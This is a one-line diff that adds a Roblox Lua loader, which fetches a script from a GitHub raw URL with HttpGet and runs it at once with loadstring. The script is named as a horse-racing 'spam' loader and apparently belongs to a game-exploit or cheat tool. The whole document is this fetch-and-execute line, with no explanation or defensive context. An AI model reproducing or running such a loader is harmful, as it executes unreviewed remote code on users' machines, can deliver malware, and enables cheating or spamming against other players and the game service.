@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/catastrophic-horse-racing-spam3-pi6ctfh4oe9udv.lua"))()
